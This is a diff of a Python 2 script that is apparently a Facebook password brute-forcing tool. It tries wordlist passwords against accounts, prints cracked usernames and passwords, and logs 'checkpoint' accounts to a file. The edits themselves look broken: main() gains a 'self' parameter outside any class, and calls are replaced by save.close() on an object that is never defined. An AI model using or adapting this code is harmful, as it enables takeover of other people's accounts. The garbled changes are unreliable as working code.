@@ -18,7 +18,7 @@ def jalan(s):
         sys.stdout.flush()
         time.sleep(random.random() * 0.1)
 
-def main():
+def main(self, cookie, url, config):
     os.system('clear')
     try:
         toket = open('login.txt', 'r').read()
@@ -56,7 +56,7 @@ def main():
                         print 52 * '\x1b[1;97m\xe2\x95\x90'
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
-                        keluar()
+                        save.close()
                     else:
                         if 'www.facebook.com' in mpsh['error_msg']:
                             ceks = open('Brutecekpoint.txt', 'w')
@@ -67,7 +67,7 @@ def main():
                             print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
-                            keluar()
+                            save.close()
                 except requests.exceptions.ConnectionError:
                     print '\x1b[1;91m[!] Connection Error'
                     time.sleep(1)
@@ -75,3 +75,4 @@ def main():
         except IOError:
             print '\x1b[1;91m[!] File not found...'
             print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""
+            save.close()
